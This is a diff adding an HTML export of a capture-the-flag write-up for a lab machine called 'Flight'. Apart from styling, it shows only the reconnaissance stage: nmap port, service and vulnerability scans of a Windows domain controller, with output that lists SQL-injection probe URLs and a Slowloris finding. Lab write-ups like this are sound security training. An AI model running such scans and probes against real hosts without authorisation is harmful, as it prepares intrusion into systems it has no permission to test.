@@ -1,0 +1,1960 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Flight - 10.10.11.187</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: undefined; }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-transparentGray { background-color: undefined; }
+.select-value-color-translucentGray { background-color: undefined; }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="199d1b9f-8847-80eb-a99b-eeddbc6ca9b0" class="page sans"><header><h1 class="page-title"><strong>Flight - 10.10.11.187</strong></h1><p class="page-description"></p></header><div class="page-body"><h1 id="199d1b9f-8847-8189-b7e4-cd740a24c456" class="">Information Gathering &amp; Enumeration</h1><p id="199d1b9f-8847-8173-9b1d-e43c3f37d696" class="">
+</p><h2 id="199d1b9f-8847-8122-a5cf-faea3954b8bf" class="">Web</h2><figure id="199d1b9f-8847-8037-94fd-d28f20b1fa4f" class="image"><a href="../img/Flight/image.png"><img style="width:709.96875px" src="../img/Flight/image.png"/></a></figure><h2 id="199d1b9f-8847-8151-8bb4-ce7b584cb7a3" class="">NMAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-81dc-a930-db7f30e0392d" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">                                                                                                                
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ sudo nmap -sS --min-rate=5000 -p- -T5 -n 10.10.11.187
+[sudo] password for drroot: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 00:06 -05
+Nmap scan report for 10.10.11.187
+Host is up (0.12s latency).
+Not shown: 65517 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+9389/tcp  open  adws
+49667/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown
+49693/tcp open  unknown
+49700/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 39.84 seconds
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-81ba-8b13-d263bc1b281a" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ nmap -sVC -T5 -n 10.10.11.187 -p53,80,88,135,139,389,445,464,593,636,3268,3269,9389
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 00:07 -05
+Nmap scan report for 10.10.11.187
+Host is up (0.12s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
+|_http-title: g0 Aviation
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-13 12:08:06Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+9389/tcp open  mc-nmf        .NET Message Framing
+Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-02-13T12:08:14
+|_  start_date: N/A
+|_clock-skew: 6h59m59s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 57.33 seconds
+</code></pre><p id="199d1b9f-8847-814d-b505-c2423b21b80c" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-816c-8dac-eadd92be7732" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ nmap --script vuln 10.10.11.187 -p53,80,88,135,139,389,445,464,593,636,3268,3269,9389
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 00:10 -05
+Nmap scan report for 10.10.11.187
+Host is up (0.12s latency).
+
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.
+| http-sql-injection: 
+|   Possible sqli for queries:
+|     http://10.10.11.187:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=N%3BO%3DD%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=M%3BO%3DD%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=S%3BO%3DD%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/ie6_warning/?C=S%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/ie6_warning/?C=D%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/ie6_warning/?C=N%3BO%3DD%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/ie6_warning/?C=M%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=D%3BO%3DD%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider
+|     http://10.10.11.187:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider
+|_    http://10.10.11.187:80/js/b.url;this.cc(c,j)}}}for(j=a?a.length%3A0%3Bthis.xa%28%22bgImage%22%2Bj%2B%2B%29%3B%29%3B%7D%2Ccc%3Afunction%28a%2Cb%29%7BD.q.ib%28a.fill.src%2Cfunction%28c%29%7Bvar=%27%20OR%20sqlspider
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server&#x27;s resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       http://ha.ckers.org/slowloris/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+| http-csrf: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.11.187
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://10.10.11.187:80/
+|     Form id: form_1
+|     Form action: #
+|     
+|     Path: http://10.10.11.187:80/index.html
+|     Form id: form_1
+|_    Form action: #
+|_http-trace: TRACE is enabled
+|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.
+| http-enum: 
+|   /css/: Potentially interesting directory w/ listing on &#x27;apache/2.4.52 (win64) openssl/1.1.1m php/8.1.1&#x27;
+|   /icons/: Potentially interesting folder w/ directory listing
+|   /images/: Potentially interesting directory w/ listing on &#x27;apache/2.4.52 (win64) openssl/1.1.1m php/8.1.1&#x27;
+|_  /js/: Potentially interesting directory w/ listing on &#x27;apache/2.4.52 (win64) openssl/1.1.1m php/8.1.1&#x27;
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+|_ssl-ccs-injection: No reply from server (TIMEOUT)
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+|_ssl-ccs-injection: No reply from server (TIMEOUT)
+9389/tcp open  adws
+
+Host script results:
+|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+|_smb-vuln-ms10-054: false
+
+
+                                                                </code></pre><h2 id="199d1b9f-8847-810d-844f-dfbffdf67753" class="">LDAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-81cb-b4ba-e25d4d49cf2f" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ nmap -T4 -Pn --script &quot;ldap* and not brute&quot; 10.10.11.187
